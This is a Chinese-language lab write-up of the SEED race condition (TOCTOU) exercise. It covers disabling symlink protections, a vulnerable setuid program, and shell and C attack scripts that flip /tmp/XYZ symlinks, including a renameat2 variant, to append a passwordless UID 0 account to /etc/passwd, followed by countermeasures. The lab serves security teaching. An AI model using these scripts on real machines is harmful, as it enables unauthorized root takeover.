# lab setup

/tmp目录具有Sticky Bit（SBIT），可以看到权限是drwxrwxrwt，这意味着任何人都可以在 /tmp内新增、修改文件，但仅有该文件/目录建立者与 root 能够删除自己的目录或文件

```
drwxrwxrwt  24 root root 4.0K Nov  1 20:09 tmp/
```

Linux的保护机制：

- “symlinks in world-writable sticky directories (e.g./tmp) cannot be followed if the follower and directory owner do not match the symlink owner.”
- prevents the root from writing to the files in /tmp that are owned by others. In this lab, we need to disable these protections.

具体可以参见：https://wiki.ubuntu.com/Security/Features#Symlink_restrictions

Stack Overflow上也有类似的问题：https://unix.stackexchange.com/questions/355033/permissions-of-symlinks-inside-tmp

为了实验的正常进行，关闭保护机制：

```shell
$ sudo sysctl -w fs.protected_symlinks=0
$ sudo sysctl fs.protected_regular=0
```

一个容易受到攻击的程序：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{
    char* fn = "/tmp/XYZ";
    char buffer[60];
    FILE* fp;

    /* get user input */
    scanf("%50s", buffer);

    if (!access(fn, W_OK)) {
        fp = fopen(fn, "a+");
        if (!fp) {
            perror("Open failed");
            exit(1);
        }
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    } else {
        printf("No permission \n");
    }

    return 0;
}
```

- access() system call checks if the Real User ID has write access to /tm/X.After the check, the file is opened for writing
- open() checks the effective user id which is 0 and hence file will be opened
- root用户可以在任意文件执行写操作

![](/image/racecondition.png)

# Task 1: Choosing Our Target

在`/etc/passwd`文件中，每个用户都有一个条目（行），用冒号(:)分隔的七个字段组成。下面是一个栗子：

```shell
root:x:0:0:root:/root:/bin/bash
```

从左到右分别是：

- 用户名
- 密码
- User ID 
- Group ID
- 注释
- home directory
- 用户登录后执行的命令

密码字段是x，表示密码存储在影子文件/etc/shadow中，需要在影子文件中查找。如果用真实密码替换掉x，那么就会直接使用这个密码（hash值），而不是在影子文件中查找

Ubuntu中有一个无密码账户的魔法值`U6aMy0wojraho `，如果我们将此值放在用户条目的密码字段中，那么只需在提示输入密码时按一下回车键即可

向`/etc/passwd`文件添加如下记录

````shell
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
````

可以创建一个具有 root 特权的新用户帐户，且不需输入密码直接回车即可，验证确实如此

# Task 2: Launching the Race Condition Attack

## Task 2.A: Simulating a Slow Machine

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{
    char* fn = "/tmp/XYZ";
    char buffer[60];
    FILE* fp;

    /* get user input */
    scanf("%50s", buffer);

    if (!access(fn, W_OK)) {
	    sleep(10);
        fp = fopen(fn, "a+");
        if (!fp) {
            perror("Open failed");
            exit(1);
        }
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    } else {
        printf("No permission \n");
    }

    return 0;
}

```

编译上面程序为root所有的4755权限的可执行程序

```shell
[11/01/22]seed@VM:~/.../Labsetup$ ln -sf /dev/null /tmp/XYZ
[11/01/22]seed@VM:~/.../Labsetup$ a.out 
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
[11/01/22]seed@VM:~/.../Labsetup$ ln -sf /etc/passwd /tmp/XYZ
```

攻击成功，可以su test无密码登录

## Task 2.B: The Real Attack

注释掉上面程序的sleep语句，在一个更加贴合正常情境进行攻击

有三个程序：

- vulp。被注释掉sleep的setuid程序，也是我们攻击的对象
- attack。不停的更改软链接的指向
- target_process.sh。不停的执行vulp程序，直到vulp成功被攻击，也即是/etc/passwd文件中被追加一行`test:U6aMy0wojraho:0:0:test:/root:/bin/bash`

```shell
#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]  
do
   echo "test:U6aMy0wojraho:0:0:test:/root:/bin/bash" | ./vulp 
   new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"
```

```c
#include<unistd.h> 
int main(void){ 
	while(1){ 
		unlink("/tmp/XYZ"); 
		symlink("/dev/null", "/tmp/XYZ"); 
		usleep(100); 
		unlink("/tmp/XYZ"); 
		symlink("/etc/passwd", "/tmp/XYZ"); 
		usleep(100); 
	}
	return 0; 
}

```

/tmp/XYZ每一百毫秒更改一次指向，在指向/dev/null和/etc/passwd之间左右横跳

![](/image/Snipaste_2022-11-02_16-30-22.png)

在一个shell中运行target_process.sh，另一个shell中运行attack，在几秒内即可攻击成功，发现/etc/passwd中追加了一行`test:U6aMy0wojraho:0:0:test:/root:/bin/bash `

## Task 2.C: An Improved Attack Method

上面的attack.c程序具有竞争条件漏洞，因为当access之后，open之前可能会unlink一下，然后open之后/tmp/xyz就会成为一个root所有的程序，此后攻击程序将无法再更改/tmp/xyz

> `/tmp` 文件夹有一个“粘性”位，此目录下的文件的所有者才能删除该文件

改良后的attack.c：

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
int main()
{
    unsigned int flags = RENAME_EXCHANGE;
    unlink("/tmp/XYZ"); symlink("/dev/null", "/tmp/XYZ");
    unlink("/tmp/ABC"); symlink("/etc/passwd", "/tmp/ABC");
	while(1){
    	renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
	}
    return 0; 
}
```

新程序使用renameat2系统调用自动切换链接指向，这允许我们在不引入任何竞态条件的情况下更改/tmp/XYZ 指向的内容

重复task2B操作，攻击成功

# Task 3: Countermeasures

## Task 3.A: Applying the Principle of Least Privilege

最小特权原则：使用 seteuid 系统调用暂时禁用 root 权限，然后在必要时启用它

> 在执行易受攻击的函数之前，我们禁用特权; 在易受攻击的函数返回之后，我们重新启用该特权

```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{
	uid_t uid = getuid(); //真实用户id
	uid_t euid = geteuid();//有效用户id，如果是setuid程序那么会具有root权限 
	seteuid(uid); 
	
	/* 执行不需要root特权的操作 */
	
	seteuid(euid); 
   	return 0;
}
```

## Task 3.B: Using Ubuntu’s Built-in Scheme

```shell
// On Ubuntu 16.04 and 20.04, use the following command:
$ sudo sysctl -w fs.protected_symlinks=1
// On Ubuntu 12.04, use the following command:
$ sudo sysctl -w kernel.yama.protected_sticky_symlinks=1
```